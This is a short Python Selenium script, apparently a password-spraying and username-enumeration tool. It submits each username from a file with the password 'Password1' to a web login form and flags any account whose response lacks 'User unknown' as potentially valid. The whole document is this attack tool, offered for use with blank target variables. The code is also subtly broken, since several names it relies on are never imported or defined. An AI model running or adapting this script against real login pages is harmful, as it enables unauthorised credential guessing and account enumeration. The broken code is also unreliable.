from selenium import webdriver
from selenium.webdriver.chrome.options import Options

# VARIABLES TO MODIFY:
password_to_spray = "Password1"
url = ""
username_filename = ""

# Constant Variables
valid_usernames = []
chrome_options = Options()
chrome_options.add_argument("--headless=new")
chrome_options.add_argument("--mute-audio")
chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
browser = webdriver.Chrome(options=chrome_options)

# Read the file containing the list of usernames
with open(username_filename) as file:
    usernames = [line.rstrip() for line in file]

# Main
for username in usernames:
    browser.get(url)
    WebDriverWait(browser, 20).until(EC.element_to_be_clickable((By.CSS_SELECTOR, f"[name='m_cUserName']")))
    browser.find_element(By.CSS_SELECTOR, f"[name='m_cUserName']").send_keys(username)
    browser.find_element(By.CSS_SELECTOR, f"[name='m_cPassword']").send_keys(password_to_spray + "\n")
    time.sleep(3)

    if "User unknown" in browser.page_source:
        print(f"{bColors.FAIL}Unknown User:{bColors.ENDC} {username}")
    else:
        print(f"{bColors.OKGREEN}Potential User:{bColors.ENDC} {username}\n{browser.page_source}")
        valid_usernames.append(username)

# Print the Results
if valid_usernames:
    print(f"\n\nPotentially Valid Usernames:")
    for valid_username in valid_usernames:
        print(valid_username)
else:
    print("No Valid Usernames Found")
